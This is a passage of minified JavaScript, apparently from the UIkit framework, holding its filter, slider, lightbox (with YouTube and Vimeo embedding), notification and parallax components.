        var e = t.getBoundingClientRect(),
            i = e.height,
            n = e.width,
            r = Qe(t),
            o = r.top,
            s = r.left;
        return {
            top: o += P(De(t, "marginTop")),
            left: s,
            height: i,
            width: n
        }
    }
    var fr = {
        mixins: [lr],
        args: "target",
        props: {
            target: Boolean,
            selActive: Boolean
        },
        data: {
            target: null,
            selActive: !1,
            attrItem: "uk-filter-control",
            cls: "uk-active",
            animation: 250
        },
        computed: {
            toggles: {
                get: function(t, e) {
                    t.attrItem;
                    return ye("[" + this.attrItem + "],[data-" + this.attrItem + "]", e)
                },
                watch: function() {
                    this.setState(this.getState(), !1)
                }
            },
            target: function(t, e) {
                return be(t.target, e)
            },
            children: {
                get: function() {
                    return L(this.target.children)
                },
                watch: function(t, e) {
                    var i, n;
                    n = e, (i = t).length === n.length && i.every(function(t) {
                        return ~n.indexOf(t)
                    }) || this.updateState()
                }
            }
        },
        events: [{
            name: "click",
            delegate: function() {
                return "[" + this.attrItem + "],[data-" + this.attrItem + "]"
            },
            handler: function(t) {
                t.preventDefault(), this.apply(t.current)
            }
        }],
        connected: function() {
            var e = this;
            if (!1 !== this.selActive) {
                var i = ye(this.selActive, this.$el);
                this.toggles.forEach(function(t) {
                    return Ee(t, e.cls, b(i, t))
                })
            }
        },
        methods: {
            apply: function(t) {
                this.setState(mr(t, this.attrItem, this.getState()))
            },
            getState: function() {
                var i = this;
                return this.toggles.filter(function(t) {
                    return Te(t, i.cls)
                }).reduce(function(t, e) {
                    return mr(e, i.attrItem, t)
                }, {
                    filter: {
                        "": ""
                    },
                    sort: []
                })
            },
            setState: function(l, t) {
                var c = this;
                void 0 === t && (t = !0), l = R({
                    filter: {
                        "": ""
                    },
                    sort: []
                }, l), jt(this.$el, "beforeFilter", [this, l]);
                var u = this.children;
                this.toggles.forEach(function(t) {
                    return Ee(t, c.cls, function(t, e, i) {
                        var n = i.filter;
                        void 0 === n && (n = {
                            "": ""
                        });
                        var r = i.sort,
                            o = r[0],
                            s = r[1],
                            a = pr(t, e),
                            h = a.filter,
                            l = a.group;
                        void 0 === l && (l = "");
                        var c = a.sort,
                            u = a.order;
                        void 0 === u && (u = "asc");
                        return h = O(c) ? h || "" : h, c = O(h) ? c || "" : c, (O(h) || l in n && h === n[l]) && (O(c) || o === c && s === u)
                    }(t, c.attrItem, l))
                });
                var e = function() {
                    var t, e, i = (t = l.filter, e = "", q(t, function(t) {
                        return e += t || ""
                    }), e);
                    u.forEach(function(t) {
                        return De(t, "display", i && !pt(t, i) ? "none" : "")
                    });
                    var n, r, o = l.sort,
                        s = o[0],
                        a = o[1];
                    if (s) {
                        var h = (n = s, r = a, R([], u).sort(function(t, e) {
                            return it(t, n).localeCompare(it(e, n), void 0, {
                                numeric: !0
                            }) * ("asc" === r || -1)
                        }));
                        V(h, u) || h.forEach(function(t) {
                            return ae(c.target, t)
                        })
                    }
                };
                t ? this.animate(e).then(function() {
                    return jt(c.$el, "afterFilter", [c])
                }) : (e(), jt(this.$el, "afterFilter", [this]))
            },
            updateState: function() {
                this.setState(this.getState(), !1)
            }
        }
    };

    function pr(t, e) {
        return Ii(it(t, e), ["filter"])
    }

    function mr(t, s, a) {
        return L(t).forEach(function(t) {
            var e = pr(t, s),
                i = e.filter,
                n = e.group,
                r = e.sort,
                o = e.order;
            void 0 === o && (o = "asc"), (i || O(r)) && (n ? (delete a.filter[""], a.filter[n] = i) : a.filter = {
                "": i || ""
            }), O(r) || (a.sort = [r, o])
        }), a
    }
    var gr = {
        slide: {
            show: function(t) {
                return [{
                    transform: wr(-100 * t)
                }, {
                    transform: wr()
                }]
            },
            percent: function(t) {
                return vr(t)
            },
            translate: function(t, e) {
                return [{
                    transform: wr(-100 * e * t)
                }, {
                    transform: wr(100 * e * (1 - t))
                }]
            }
        }
    };

    function vr(t) {
        return Math.abs(De(t, "transform").split(",")[4] / t.offsetWidth) || 0
    }

    function wr(t, e) {
        return void 0 === t && (t = 0), void 0 === e && (e = "%"), "translateX(" + t + (t ? e : "") + ")"
    }

    function br(t) {
        return "scale3d(" + t + ", " + t + ", 1)"
    }
    var yr = R({}, gr, {
        fade: {
            show: function() {
                return [{
                    opacity: 0
                }, {
                    opacity: 1
                }]
            },
            percent: function(t) {
                return 1 - De(t, "opacity")
            },
            translate: function(t) {
                return [{
                    opacity: 1 - t
                }, {
                    opacity: t
                }]
            }
        },
        scale: {
            show: function() {
                return [{
                    opacity: 0,
                    transform: br(.8)
                }, {
                    opacity: 1,
                    transform: br(1)
                }]
            },
            percent: function(t) {
                return 1 - De(t, "opacity")
            },
            translate: function(t) {
                return [{
                    opacity: 1 - t,
                    transform: br(1 - .2 * t)
                }, {
                    opacity: t,
                    transform: br(.8 + .2 * t)
                }]
            }
        }
    });

    function xr(t, e, i) {
        jt(t, Wt(e, !1, !1, i))
    }
    var kr = {
        mixins: [{
            props: {
                autoplay: Boolean,
                autoplayInterval: Number,
                pauseOnHover: Boolean
            },
            data: {
                autoplay: !1,
                autoplayInterval: 7e3,
                pauseOnHover: !0
            },
            connected: function() {
                this.startAutoplay(), this.userInteracted = !1
            },
            disconnected: function() {
                this.stopAutoplay()
            },
            events: [{
                name: "visibilitychange",
                el: document,
                handler: function() {
                    document.hidden ? this.stopAutoplay() : !this.userInteracted && this.startAutoplay()
                }
            }, {
                name: Mt,
                handler: function() {
                    this.userInteracted = !0, this.stopAutoplay()
                }
            }, {
                name: "mouseenter",
                filter: function() {
                    return this.autoplay
                },
                handler: function() {
                    this.isHovering = !0
                }
            }, {
                name: "mouseleave",
                filter: function() {
                    return this.autoplay
                },
                handler: function() {
                    this.isHovering = !1
                }
            }],
            methods: {
                startAutoplay: function() {
                    var t = this;
                    this.stopAutoplay(), this.autoplay && (this.interval = setInterval(function() {
                        return !(t.isHovering && t.pauseOnHover) && !t.stack.length && t.show("next")
                    }, this.autoplayInterval))
                },
                stopAutoplay: function() {
                    this.interval && clearInterval(this.interval)
                }
            }
        }, {
            props: {
                draggable: Boolean
            },
            data: {
                draggable: !0,
                threshold: 10
            },
            created: function() {
                var n = this;
                ["start", "move", "end"].forEach(function(t) {
                    var i = n[t];
                    n[t] = function(t) {
                        var e = Di(t).x * (Ct ? -1 : 1);
                        n.prevPos = e !== n.pos ? n.pos : n.prevPos, n.pos = e, i(t)
                    }
                })
            },
            events: [{
                name: Mt,
                delegate: function() {
                    return this.selSlides
                },
                handler: function(t) {
                    var e;
                    !this.draggable || !Mi(t) && (!(e = t.target).children.length && e.childNodes.length) || 0 < t.button || this.length < 2 || this.start(t)
                }
            }, {
                name: "touchmove",
                passive: !1,
                handler: "move",
                delegate: function() {
                    return this.selSlides
                }
            }, {
                name: "dragstart",
                handler: function(t) {
                    t.preventDefault()
                }
            }],
            methods: {
                start: function() {
                    var t = this;
                    this.drag = this.pos, this._transitioner ? (this.percent = this._transitioner.percent(), this.drag += this._transitioner.getDistance() * this.percent * this.dir, this._transitioner.cancel(), this._transitioner.translate(this.percent), this.dragging = !0, this.stack = []) : this.prevIndex = this.index;
                    var e = "touchmove" !== Dt ? Ht(document, Dt, this.move, {
                        passive: !1
                    }) : K;
                    this.unbindMove = function() {
                        e(), t.unbindMove = null
                    }, Ht(window, "scroll", this.unbindMove), Ht(document, Ot, this.end, !0)
                },
                move: function(t) {
                    var e = this;
                    if (this.unbindMove) {
                        var i = this.pos - this.drag;
                        if (!(0 === i || this.prevPos === this.pos || !this.dragging && Math.abs(i) < this.threshold)) {
                            t.cancelable && t.preventDefault(), this.dragging = !0, this.dir = i < 0 ? 1 : -1;
                            for (var n = this.slides, r = this.prevIndex, o = Math.abs(i), s = this.getIndex(r + this.dir, r), a = this._getDistance(r, s) || n[r].offsetWidth; s !== r && a < o;) this.drag -= a * this.dir, r = s, o -= a, s = this.getIndex(r + this.dir, r), a = this._getDistance(r, s) || n[r].offsetWidth;
                            this.percent = o / a;
                            var h, l = n[r],
                                c = n[s],
                                u = this.index !== s,
                                d = r === s;
                            [this.index, this.prevIndex].filter(function(t) {
                                return !b([s, r], t)
                            }).forEach(function(t) {
                                jt(n[t], "itemhidden", [e]), d && (h = !0, e.prevIndex = r)
                            }), (this.index === r && this.prevIndex !== r || h) && jt(n[this.index], "itemshown", [this]), u && (this.prevIndex = r, this.index = s, !d && jt(l, "beforeitemhide", [this]), jt(c, "beforeitemshow", [this])), this._transitioner = this._translate(Math.abs(this.percent), l, !d && c), u && (!d && jt(l, "itemhide", [this]), jt(c, "itemshow", [this]))
                        }
                    }
                },
                end: function() {
                    if (Ft(window, "scroll", this.unbindMove), this.unbindMove && this.unbindMove(), Ft(document, Ot, this.end, !0), this.dragging) {
                        if (this.dragging = null, this.index === this.prevIndex) this.percent = 1 - this.percent, this.dir *= -1, this._show(!1, this.index, !0), this._transitioner = null;
                        else {
                            var t = (Ct ? this.dir * (Ct ? 1 : -1) : this.dir) < 0 == this.prevPos > this.pos;
                            this.index = t ? this.index : this.prevIndex, t && (this.percent = 1 - this.percent), this.show(0 < this.dir && !t || this.dir < 0 && t ? "next" : "previous", !0)
                        }
                        Ut()
                    }
                    this.drag = this.percent = null
                }
            }
        }, {
            data: {
                selNav: !1
            },
            computed: {
                nav: function(t, e) {
                    return be(t.selNav, e)
                },
                selNavItem: function(t) {
                    var e = t.attrItem;
                    return "[" + e + "],[data-" + e + "]"
                },
                navItems: function(t, e) {
                    return ye(this.selNavItem, e)
                }
            },
            update: {
                write: function() {
                    var i = this;
                    this.nav && this.length !== this.nav.children.length && se(this.nav, this.slides.map(function(t, e) {
                        return "<li " + i.attrItem + '="' + e + '"><a href="#"></a></li>'
                    }).join("")), Ee(ye(this.selNavItem, this.$el).concat(this.nav), "uk-hidden", !this.maxIndex), this.updateNav()
                },
                events: ["resize"]
            },
            events: [{
                name: "click",
                delegate: function() {
                    return this.selNavItem
                },
                handler: function(t) {
                    t.preventDefault(), this.show(it(t.current, this.attrItem))
                }
            }, {
                name: "itemshow",
                handler: "updateNav"
            }],
            methods: {
                updateNav: function() {
                    var i = this,
                        n = this.getValidIndex();
                    this.navItems.forEach(function(t) {
                        var e = it(t, i.attrItem);
                        Ee(t, i.clsActive, z(e) === n), Ee(t, "uk-invisible", i.finite && ("previous" === e && 0 === n || "next" === e && n >= i.maxIndex))
                    })
                }
            }
        }],
        props: {
            clsActivated: Boolean,
            easing: String,
            index: Number,
            finite: Boolean,
            velocity: Number
        },
        data: function() {
            return {
                easing: "ease",
                finite: !1,
                velocity: 1,
                index: 0,
                stack: [],
                percent: 0,
                clsActive: "uk-active",
                clsActivated: !1,
                Transitioner: !1,
                transitionOptions: {}
            }
        },
        computed: {
            duration: function(t, e) {
                var i = t.velocity;
                return $r(e.offsetWidth / i)
            },
            length: function() {
                return this.slides.length
            },
            list: function(t, e) {
                return be(t.selList, e)
            },
            maxIndex: function() {
                return this.length - 1
            },
            selSlides: function(t) {
                return t.selList + " > *"
            },
            slides: function() {
                return L(this.list.children)
            }
        },
        events: {
            itemshown: function() {
                this.$update(this.list)
            }
        },
        methods: {
            show: function(t, e) {
                var i = this;
                if (void 0 === e && (e = !1), !this.dragging && this.length) {
                    var n = this.stack,
                        r = e ? 0 : n.length,
                        o = function() {
                            n.splice(r, 1), n.length && i.show(n.shift(), !0)
                        };
                    if (n[e ? "unshift" : "push"](t), !e && 1 < n.length) 2 === n.length && this._transitioner.forward(Math.min(this.duration, 200));
                    else {
                        var s = this.index,
                            a = Te(this.slides, this.clsActive) && this.slides[s],
                            h = this.getIndex(t, this.index),
                            l = this.slides[h];
                        if (a !== l) {
                            var c, u;
                            if (this.dir = (u = s, "next" === (c = t) ? 1 : "previous" === c ? -1 : c < u ? -1 : 1), this.prevIndex = s, this.index = h, a && jt(a, "beforeitemhide", [this]), !jt(l, "beforeitemshow", [this, a])) return this.index = this.prevIndex, void o();
                            var d = this._show(a, l, e).then(function() {
                                return a && jt(a, "itemhidden", [i]), jt(l, "itemshown", [i]), new Xt(function(t) {
                                    pi.write(function() {
                                        n.shift(), n.length ? i.show(n.shift(), !0) : i._transitioner = null, t()
                                    })
                                })
                            });
                            return a && jt(a, "itemhide", [this]), jt(l, "itemshow", [this]), d
                        }
                        o()
                    }
                }
            },
            getIndex: function(t, e) {
                return void 0 === t && (t = this.index), void 0 === e && (e = this.index), X(re(t, this.slides, e, this.finite), 0, this.maxIndex)
            },
            getValidIndex: function(t, e) {
                return void 0 === t && (t = this.index), void 0 === e && (e = this.prevIndex), this.getIndex(t, e)
            },
            _show: function(t, e, i) {
                if (this._transitioner = this._getTransitioner(t, e, this.dir, R({
                        easing: i ? e.offsetWidth < 600 ? "cubic-bezier(0.25, 0.46, 0.45, 0.94)" : "cubic-bezier(0.165, 0.84, 0.44, 1)" : this.easing
                    }, this.transitionOptions)), !i && !t) return this._transitioner.translate(1), Xt.resolve();
                var n = this.stack.length;
                return this._transitioner[1 < n ? "forward" : "show"](1 < n ? Math.min(this.duration, 75 + 75 / (n - 1)) : this.duration, this.percent)
            },
            _getDistance: function(t, e) {
                return new this._getTransitioner(t, t !== e && e).getDistance()
            },
            _translate: function(t, e, i) {
                void 0 === e && (e = this.prevIndex), void 0 === i && (i = this.index);
                var n = this._getTransitioner(e !== i && e, i);
                return n.translate(t), n
            },
            _getTransitioner: function(t, e, i, n) {
                return void 0 === t && (t = this.prevIndex), void 0 === e && (e = this.index), void 0 === i && (i = this.dir || 1), void 0 === n && (n = this.transitionOptions), new this.Transitioner(M(t) ? this.slides[t] : t, M(e) ? this.slides[e] : e, i * (Ct ? -1 : 1), n)
            }
        }
    };

    function $r(t) {
        return .5 * t + 300
    }
    var Ir = {
            mixins: [kr],
            props: {
                animation: String
            },
            data: {
                animation: "slide",
                clsActivated: "uk-transition-active",
                Animations: gr,
                Transitioner: function(o, s, a, t) {
                    var e = t.animation,
                        h = t.easing,
                        i = e.percent,
                        n = e.translate,
                        r = e.show;
                    void 0 === r && (r = K);
                    var l = r(a),
                        c = new Kt;
                    return {
                        dir: a,
                        show: function(t, e, i) {
                            var n = this;
                            void 0 === e && (e = 0);
                            var r = i ? "linear" : h;
                            return t -= Math.round(t * X(e, -1, 1)), this.translate(e), xr(s, "itemin", {
                                percent: e,
                                duration: t,
                                timing: r,
                                dir: a
                            }), xr(o, "itemout", {
                                percent: 1 - e,
                                duration: t,
                                timing: r,
                                dir: a
                            }), Xt.all([Ve.start(s, l[1], t, r), Ve.start(o, l[0], t, r)]).then(function() {
                                n.reset(), c.resolve()
                            }, K), c.promise
                        },
                        stop: function() {
                            return Ve.stop([s, o])
                        },
                        cancel: function() {
                            Ve.cancel([s, o])
                        },
                        reset: function() {
                            for (var t in l[0]) De([s, o], t, "")
                        },
                        forward: function(t, e) {
                            return void 0 === e && (e = this.percent()), Ve.cancel([s, o]), this.show(t, e, !0)
                        },
                        translate: function(t) {
                            this.reset();
                            var e = n(t, a);
                            De(s, e[1]), De(o, e[0]), xr(s, "itemtranslatein", {
                                percent: t,
                                dir: a
                            }), xr(o, "itemtranslateout", {
                                percent: 1 - t,
                                dir: a
                            })
                        },
                        percent: function() {
                            return i(o || s, s, a)
                        },
                        getDistance: function() {
                            return o && o.offsetWidth
                        }
                    }
                }
            },
            computed: {
                animation: function(t) {
                    var e = t.animation,
                        i = t.Animations;
                    return R(e in i ? i[e] : i.slide, {
                        name: e
                    })
                },
                transitionOptions: function() {
                    return {
                        animation: this.animation
                    }
                }
            },
            events: {
                "itemshow itemhide itemshown itemhidden": function(t) {
                    var e = t.target;
                    this.$update(e)
                },
                itemshow: function() {
                    M(this.prevIndex) && pi.flush()
                },
                beforeitemshow: function(t) {
                    ke(t.target, this.clsActive)
                },
                itemshown: function(t) {
                    ke(t.target, this.clsActivated)
                },
                itemhidden: function(t) {
                    $e(t.target, this.clsActive, this.clsActivated)
                }
            }
        },
        Sr = {
            mixins: [jn, Wn, ji, Ir],
            functional: !0,
            props: {
                delayControls: Number,
                preload: Number,
                videoAutoplay: Boolean,
                template: String
            },
            data: function() {
                return {
                    preload: 1,
                    videoAutoplay: !1,
                    delayControls: 3e3,
                    items: [],
                    cls: "uk-open",
                    clsPage: "uk-lightbox-page",
                    selList: ".uk-lightbox-items",
                    attrItem: "uk-lightbox-item",
                    selClose: ".uk-close-large",
                    pauseOnHover: !1,
                    velocity: 2,
                    Animations: yr,
                    template: '<div class="uk-lightbox uk-overflow-hidden"> <ul class="uk-lightbox-items"></ul> <div class="uk-lightbox-toolbar uk-position-top uk-text-right uk-transition-slide-top uk-transition-opaque"> <button class="uk-lightbox-toolbar-icon uk-close-large" type="button" uk-close></button> </div> <a class="uk-lightbox-button uk-position-center-left uk-position-medium uk-transition-fade" href="#" uk-slidenav-previous uk-lightbox-item="previous"></a> <a class="uk-lightbox-button uk-position-center-right uk-position-medium uk-transition-fade" href="#" uk-slidenav-next uk-lightbox-item="next"></a> <div class="uk-lightbox-toolbar uk-lightbox-caption uk-position-bottom uk-text-center uk-transition-slide-bottom uk-transition-opaque"></div> </div>'
                }
            },
            created: function() {
                var t = this;
                this.$mount(ae(this.container, this.template)), this.caption = be(".uk-lightbox-caption", this.$el), this.items.forEach(function() {
                    return ae(t.list, "<li></li>")
                })
            },
            events: [{
                name: Dt + " " + Mt + " keydown",
                handler: "showControls"
            }, {
                name: Ot,
                self: !0,
                delegate: function() {
                    return this.selSlides
                },
                handler: function(t) {
                    t.preventDefault(), this.hide()
                }
            }, {
                name: "shown",
                self: !0,
                handler: function() {
                    this.startAutoplay(), this.showControls()
                }
            }, {
                name: "hide",
                self: !0,
                handler: function() {
                    this.stopAutoplay(), this.hideControls(), $e(this.slides, this.clsActive), Ve.stop(this.slides)
                }
            }, {
                name: "hidden",
                self: !0,
                handler: function() {
                    this.$destroy(!0)
                }
            }, {
                name: "keyup",
                el: document,
                handler: function(t) {
                    if (this.isToggled(this.$el)) switch (t.keyCode) {
                        case 37:
                            this.show("previous");
                            break;
                        case 39:
                            this.show("next")
                    }
                }
            }, {
                name: "beforeitemshow",
                handler: function(t) {
                    this.isToggled() || (this.draggable = !1, t.preventDefault(), this.toggleNow(this.$el, !0), this.animation = yr.scale, $e(t.target, this.clsActive), this.stack.splice(1, 0, this.index))
                }
            }, {
                name: "itemshow",
                handler: function(t) {
                    var e = ne(t.target),
                        i = this.getItem(e).caption;
                    De(this.caption, "display", i ? "" : "none"), se(this.caption, i);
                    for (var n = 0; n <= this.preload; n++) this.loadItem(this.getIndex(e + n)), this.loadItem(this.getIndex(e - n))
                }
            }, {
                name: "itemshown",
                handler: function() {
                    this.draggable = this.$props.draggable
                }
            }, {
                name: "itemload",
                handler: function(t, r) {
                    var o, s = this,
                        e = r.source,
                        i = r.type,
                        n = r.alt;
                    if (this.setItem(r, "<span uk-spinner></span>"), e)
                        if ("image" === i || e.match(/\.(jp(e)?g|png|gif|svg)($|\?)/i)) ee(e).then(function(t) {
                            return s.setItem(r, '<img width="' + t.width + '" height="' + t.height + '" src="' + e + '" alt="' + (n || "") + '">')
                        }, function() {
                            return s.setError(r)
                        });
                        else if ("video" === i || e.match(/\.(mp4|webm|ogv)($|\?)/i)) {
                        var a = be("<video controls playsinline" + (r.poster ? ' poster="' + r.poster + '"' : "") + ' uk-video="' + this.videoAutoplay + '"></video>');
                        Q(a, "src", e), Lt(a, "error loadedmetadata", function(t) {
                            "error" === t ? s.setError(r) : (Q(a, {
                                width: a.videoWidth,
                                height: a.videoHeight
                            }), s.setItem(r, a))
                        })
                    } else if ("iframe" === i || e.match(/\.(html|php)($|\?)/i)) this.setItem(r, '<iframe class="uk-lightbox-iframe" src="' + e + '" frameborder="0" allowfullscreen></iframe>');
                    else if (o = e.match(/\/\/.*?youtube(-nocookie)?\.[a-z]+\/watch\?v=([^&\s]+)/) || e.match(/()youtu\.be\/(.*)/)) {
                        var h = o[2],
                            l = function(t, e) {
                                return void 0 === t && (t = 640), void 0 === e && (e = 450), s.setItem(r, Tr("https://www.youtube" + (o[1] || "") + ".com/embed/" + h, t, e, s.videoAutoplay))
                            };
                        ee("https://img.youtube.com/vi/" + h + "/maxresdefault.jpg").then(function(t) {
                            var e = t.width,
                                i = t.height;
                            120 === e && 90 === i ? ee("https://img.youtube.com/vi/" + h + "/0.jpg").then(function(t) {
                                var e = t.width,
                                    i = t.height;
                                return l(e, i)
                            }, l) : l(e, i)
                        }, l)
                    } else(o = e.match(/(\/\/.*?)vimeo\.[a-z]+\/([0-9]+).*?/)) && te("https://vimeo.com/api/oembed.json?maxwidth=1920&url=" + encodeURI(e), {
                        responseType: "json",
                        withCredentials: !1
                    }).then(function(t) {
                        var e = t.response,
                            i = e.height,
                            n = e.width;
                        return s.setItem(r, Tr("https://player.vimeo.com/video/" + o[2], n, i, s.videoAutoplay))
                    }, function() {
                        return s.setError(r)
                    })
                }
            }],
            methods: {
                loadItem: function(t) {
                    void 0 === t && (t = this.index);
                    var e = this.getItem(t);
                    e.content || jt(this.$el, "itemload", [e])
                },
                getItem: function(t) {
                    return void 0 === t && (t = this.index), this.items[t] || {}
                },
                setItem: function(t, e) {
                    R(t, {
                        content: e
                    });
                    var i = se(this.slides[this.items.indexOf(t)], e);
                    jt(this.$el, "itemloaded", [this, i]), this.$update(i)
                },
                setError: function(t) {
                    this.setItem(t, '<span uk-icon="icon: bolt; ratio: 2"></span>')
                },
                showControls: function() {
                    clearTimeout(this.controlsTimer), this.controlsTimer = setTimeout(this.hideControls, this.delayControls), ke(this.$el, "uk-active", "uk-transition-active")
                },
                hideControls: function() {
                    $e(this.$el, "uk-active", "uk-transition-active")
                }
            }
        };

    function Tr(t, e, i, n) {
        return '<iframe src="' + t + '" width="' + e + '" height="' + i + '" style="max-width: 100%; box-sizing: border-box;" frameborder="0" allowfullscreen uk-video="autoplay: ' + n + '" uk-responsive></iframe>'
    }
    var Er, Cr = {
        install: function(t, e) {
            t.lightboxPanel || t.component("lightboxPanel", Sr);
            R(e.props, t.component("lightboxPanel").options.props)
        },
        props: {
            toggle: String
        },
        data: {
            toggle: "a"
        },
        computed: {
            toggles: {
                get: function(t, e) {
                    return ye(t.toggle, e)
                },
                watch: function() {
                    this.hide()
                }
            }
        },
        disconnected: function() {
            this.hide()
        },
        events: [{
            name: "click",
            delegate: function() {
                return this.toggle + ":not(.uk-disabled)"
            },
            handler: function(t) {
                t.preventDefault(), this.show(ne(this.toggles, t.current))
            }
        }],
        methods: {
            show: function(t) {
                var e = this;
                return this.panel = this.panel || this.$create("lightboxPanel", R({}, this.$props, {
                    items: this.toggles.reduce(function(t, i) {
                        return t.push(["href", "caption", "type", "poster", "alt"].reduce(function(t, e) {
                            return t["href" === e ? "source" : e] = it(i, e), t
                        }, {})), t
                    }, [])
                })), Ht(this.panel.$el, "hidden", function() {
                    return e.panel = !1
                }), this.panel.show(t)
            },
            hide: function() {
                return this.panel && this.panel.hide()
            }
        }
    };
    var Ar = {},
        Nr = {
            functional: !0,
            args: ["message", "status"],
            data: {
                message: "",
                status: "",
                timeout: 5e3,
                group: null,
                pos: "top-center",
                clsClose: "uk-notification-close",
                clsMsg: "uk-notification-message"
            },
            install: function(r) {
                r.notification.closeAll = function(i, n) {
                    we(document.body, function(t) {
                        var e = r.getComponent(t, "notification");
                        !e || i && i !== e.group || e.close(n)
                    })
                }
            },
            computed: {
                marginProp: function(t) {
                    return "margin" + (v(t.pos, "top") ? "Top" : "Bottom")
                },
                startProps: function() {
                    var t;
                    return (t = {
                        opacity: 0
                    })[this.marginProp] = -this.$el.offsetHeight, t
                }
            },
            created: function() {
                Ar[this.pos] || (Ar[this.pos] = ae(this.$container, '<div class="uk-notification uk-notification-' + this.pos + '"></div>'));
                var t = De(Ar[this.pos], "display", "block");
                this.$mount(ae(t, '<div class="' + this.clsMsg + (this.status ? " " + this.clsMsg + "-" + this.status : "") + '"> <a href="#" class="' + this.clsClose + '" data-uk-close></a> <div>' + this.message + "</div> </div>"))
            },
            connected: function() {
                var t, e = this,
                    i = P(De(this.$el, this.marginProp));
                Ve.start(De(this.$el, this.startProps), (t = {
                    opacity: 1
                }, t[this.marginProp] = i, t)).then(function() {
                    e.timeout && (e.timer = setTimeout(e.close, e.timeout))
                })
            },
            events: (Er = {
                click: function(t) {
                    gt(t.target, 'a[href="#"],a[href=""]') && t.preventDefault(), this.close()
                }
            }, Er[Bt] = function() {
                this.timer && clearTimeout(this.timer)
            }, Er[zt] = function() {
                this.timeout && (this.timer = setTimeout(this.close, this.timeout))
            }, Er),
            methods: {
                close: function(t) {
                    var e = this,
                        i = function() {
                            jt(e.$el, "close", [e]), ue(e.$el), Ar[e.pos].children.length || De(Ar[e.pos], "display", "none")
                        };
                    this.timer && clearTimeout(this.timer), t ? i() : Ve.start(this.$el, this.startProps).then(i)
                }
            }
        };
    var _r = ["x", "y", "bgx", "bgy", "rotate", "scale", "color", "backgroundColor", "borderColor", "opacity", "blur", "hue", "grayscale", "invert", "saturate", "sepia", "fopacity"],
        Mr = {
            mixins: [Pn],
            props: _r.reduce(function(t, e) {
                return t[e] = "list", t
            }, {}),
            data: _r.reduce(function(t, e) {
                return t[e] = void 0, t
            }, {}),
            computed: {
                props: function(f, p) {
                    var m = this;
                    return _r.reduce(function(t, e) {
                        if (O(f[e])) return t;
                        var i, n, r, o = e.match(/color/i),
                            s = o || "opacity" === e,
                            a = f[e].slice(0);
                        s && De(p, e, ""), a.length < 2 && a.unshift(("scale" === e ? 1 : s ? De(p, e) : 0) || 0);
                        var h = b(a.join(""), "%") ? "%" : "px";
                        if (o) {
                            var l = p.style.color;
                            a = a.map(function(t) {
                                return De(De(p, "color", t), "color").split(/[(),]/g).slice(1, -1).concat(1).slice(0, 4).map(function(t) {
                                    return P(t)
                                })
                            }), p.style.color = l
                        } else a = a.map(P);
                        if (e.match(/^bg/))
                            if (De(p, "background-position-" + e[2], ""), n = De(p, "backgroundPosition").split(" ")["x" === e[2] ? 0 : 1], m.covers) {
                                var c = Math.min.apply(Math, a),
                                    u = Math.max.apply(Math, a),
                                    d = a.indexOf(c) < a.indexOf(u);
                                r = u - c, a = a.map(function(t) {
                                    return t - (d ? c : u)
                                }), i = (d ? -r : 0) + "px"
                            } else i = n;
                        return t[e] = {
                            steps: a,
                            unit: h,
                            pos: i,
                            bgPos: n,
                            diff: r
                        }, t
                    }, {})
                },
                bgProps: function() {
                    var e = this;
                    return ["bgx", "bgy"].filter(function(t) {
                        return t in e.props
                    })
                },
                covers: function(t, e) {
                    return n = (i = e).style.backgroundSize, r = "cover" === De(De(i, "backgroundSize", ""), "backgroundSize"), i.style.backgroundSize = n, r;
                    var i, n, r
                }
            },
            disconnected: function() {
                delete this._image
            },
            update: {
                read: function(t) {
                    var h = this;
                    if (t.active = this.matchMedia, t.active) {
                        if (!t.image && this.covers && this.bgProps.length) {
                            var e = De(this.$el, "backgroundImage").replace(/^none|url\(["']?(.+?)["']?\)$/, "$1");
                            if (e) {
                                var i = new Image;
                                i.src = e, (t.image = i).naturalWidth || (i.onload = function() {
                                    return h.$emit()
                                })
                            }
                        }
                        var n = t.image;
                        if (n && n.naturalWidth) {
                            var l = {
                                    width: this.$el.offsetWidth,
                                    height: this.$el.offsetHeight
                                },
                                c = {
                                    width: n.naturalWidth,
                                    height: n.naturalHeight
                                },
                                u = Z.cover(c, l);
                            this.bgProps.forEach(function(t) {
                                var e = h.props[t],
                                    i = e.diff,
                                    n = e.bgPos,
                                    r = e.steps,
                                    o = "bgy" === t ? "height" : "width",
                                    s = u[o] - l[o];
                                if (n.match(/%$|0px/)) {
                                    if (s < i) l[o] = u[o] + i - s;
                                    else if (i < s) {
                                        var a = parseFloat(n);
                                        a && (h.props[t].steps = r.map(function(t) {
                                            return t - (s - i) / (100 / a)
                                        }))
                                    }
                                    u = Z.cover(c, l)
                                }
                            }), t.dim = u
                        }
                    }
                },
                write: function(t) {
                    var e = t.dim;
                    t.active ? e && De(this.$el, {
                        backgroundSize: e.width + "px " + e.height + "px",
                        backgroundRepeat: "no-repeat"
                    }) : De(this.$el, {
                        backgroundSize: "",
                        backgroundRepeat: ""
                    })
                },
                events: ["resize"]
            },
            methods: {
                reset: function() {
                    var i = this;
                    q(this.getCss(0), function(t, e) {
                        return De(i.$el, e, "")
                    })
                },
                getCss: function(p) {
                    var m = this.props,
                        g = !1;
                    return Object.keys(m).reduce(function(t, e) {
                        var i = m[e],
                            n = i.steps,
                            r = i.unit,
                            o = i.pos,
                            s = Or(n, p);
                        switch (e) {
                            case "x":
                            case "y":
                                if (g) break;
                                var a = ["x", "y"].map(function(t) {
                                        return e === t ? P(s).toFixed(0) + r : m[t] ? Or(m[t].steps, p, 1) + m[t].unit : 0
                                    }),
                                    h = a[0],
                                    l = a[1];
                                g = t.transform += " translate3d(" + h + ", " + l + ", 0)";
                                break;
                            case "rotate":
                                t.transform += " rotate(" + s + "deg)";
                                break;
                            case "scale":
                                t.transform += " scale(" + s + ")";
                                break;
                            case "bgy":
                            case "bgx":
                                t["background-position-" + e[2]] = "calc(" + o + " + " + (s + r) + ")";
                                break;
                            case "color":
                            case "backgroundColor":
                            case "borderColor":
                                var c = Dr(n, p),
                                    u = c[0],
                                    d = c[1],
                                    f = c[2];
                                t[e] = "rgba(" + u.map(function(t, e) {
                                    return t += f * (d[e] - t), 3 === e ? P(t) : parseInt(t, 10)
                                }).join(",") + ")";
                                break;
                            case "blur":
                                t.filter += " blur(" + s + "px)";
                                break;
                            case "hue":
                                t.filter += " hue-rotate(" + s + "deg)";
                                break;
                            case "fopacity":
                                t.filter += " opacity(" + s + "%)";
                                break;
                            case "grayscale":
                            case "invert":
                            case "saturate":
                            case "sepia":
                                t.filter += " " + e + "(" + s + "%)";
                                break;
                            default:
                                t[e] = s
                        }
                        return t
                    }, {
                        transform: "",
                        filter: ""
                    })
                }
            }
        };

    function Dr(t, e) {
